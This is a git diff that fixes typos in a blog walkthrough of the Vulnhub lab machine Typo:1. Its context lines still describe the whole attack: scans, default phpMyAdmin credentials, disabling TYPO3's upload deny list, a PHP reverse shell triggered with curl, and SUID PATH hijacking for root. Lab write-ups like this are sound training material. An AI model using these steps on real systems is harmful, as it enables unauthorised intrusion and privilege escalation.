@@ -13,7 +13,7 @@ paginate: false
 keywords: typo1, typo vulnhub, typo vulnhub walkthrough, typo walkthrough, typo 1 vulnhub, infosec articles, typo vulnhub writeup
 ---
 
-Typo:1 is another boot2root VM from Vulnhub. This machine is considered good for OSCP Preparation. I have add the machine to my hosts file, so Let's Begin!
+Typo:1 is another boot2root VM from Vulnhub. This machine is considered good for OSCP Preparation. I have added the machine to my hosts file, so Let's Begin!
 
 ```r
 root@kali:~# cat /etc/hosts
@@ -22,7 +22,7 @@ root@kali:~# cat /etc/hosts
 192.168.1.208   typo.local
 ```
 
-## Inital Enumeration and Shell
+## Initial Enumeration and Shell
 
 I started the reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.
 
@@ -62,7 +62,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 13.71 seconds
 ```
 
-We have Apache webservers running on four different ports. Next step was to run a Gobuster scan to look for hidden directories.
+We have Apache Web Servers running on four different ports. Next step was to run a Gobuster scan to look for hidden directories.
 ```r
 root@kali:~# gobuster dir -u http://typo.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o port80.log  
 
@@ -120,7 +120,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-<p align="justify"> First I went to the typo3 directory on port 80 and tried logging in with some default username and password but I wasn't successful. Then I went to the phpmyadmin directory on port 8081 and again tried some random username and passowrds. This time I was able to login with username <b>root</b> and password <b>root.</b> </p>
+<p align="justify"> First I went to the typo3 directory on port 80 and tried logging in with some default username and password but I wasn't successful. Then I went to the phpmyadmin directory on port 8081 and again tried some random username and passwords. This time I was able to login with username <b>root</b> and password <b>root.</b> </p>
 
 <center><br>
 <img src="/assets/img/uploads/typo/phpmyadmin.png">
@@ -145,19 +145,19 @@ I replaced this hash with the admin's password in the be_users table. Now, I was
 </center>
 
 <p align="justify">
-Then I went to the <b>Filelist Panel</b> to see if I can uplaod a php backdoor. Unfortunately, php uploads were disabled on this website. After some enumeration, I found an option named <b>fileDenyUpload</b> in <b>Settings > Configure Installation-Wide Options</b> which restricts certain extension from being uplaoded on the website. I cleared this option and saved the settings. </p>
+Then I went to the <b>Filelist Panel</b> to see if I can upload a php backdoor. Unfortunately, php uploads were disabled on this website. After some enumeration, I found an option named <b>fileDenyUpload</b> in <b>Settings > Configure Installation-Wide Options</b> which restricts certain extensions from being uploaded on the website. I cleared this option and saved the settings. </p>
 
 <center><br>
 <img src="/assets/img/uploads/typo/file-extensions.png">
 </center>
 
-This time, I was able to uplaod the backdoor. I used the php-reverse-shell from <a href="https://github.com/pentestmonkey/php-reverse-shell">pentest monkey.</a>
+This time, I was able to upload the backdoor. I used the php-reverse-shell from <a href="https://github.com/pentestmonkey/php-reverse-shell">pentest monkey.</a>
 
 <center><br>
 <img src="/assets/img/uploads/typo/shell-upload.png">
 </center>
 
-Then I started a netcat listener, and sent a request to the backdoor I uplaoded using <b>curl</b> on another terminal and got a reverse shell from the target machine.
+Then I started a netcat listener, and sent a request to the backdoor I uploaded using <b>curl</b> on another terminal and got a reverse shell from the target machine.
 
 ```r
 root@kali:~# curl -v http://typo.local/fileadmin/shell.php
@@ -186,7 +186,7 @@ www-data@typo:/$
 
 ## Privilege Escalation
 
-Rooting this box was trivial. I searched for SUID files and found an unsual binary named <b>apache2-restart.</b>
+Rooting this box was trivial. I searched for SUID files and found an unusual binary named <b>apache2-restart.</b>
 
 ```r
 www-data@typo:/tmp$ find / -type f -perm -u=s 2>/dev/null
@@ -205,13 +205,13 @@ find / -type f -perm -u=s 2>/dev/null
 /usr/local/bin/apache2-restart
 /usr/local/bin/phpunit
 ```
-As the name suggests, This binary <b>restarts the apache2 service.</b> I confirmed this by running <b>strings</b> command on the serivce.
+As the name suggests, This binary <b>restarts the apache2 service.</b> I confirmed this by running <b>strings</b> command on the service.
 
 <center><br>
 <img src="/assets/img/uploads/typo/strings.png">
 </center>
 
-This is one of most common privilege escalation method. All we need to do is create our own version of the service in the /tmp directory and add that path to the PATH variable. Then we can call apache2-restart, which will execute our malicious service with root privileges.
+This is one of the most common privilege escalation method. All we need to do is create our own version of the service in the /tmp directory and add that path to the PATH variable. Then we can call apache2-restart, which will execute our malicious service with root privileges.
 
 ```r
 www-data@typo:/tmp$ echo '/bin/bash' > service 
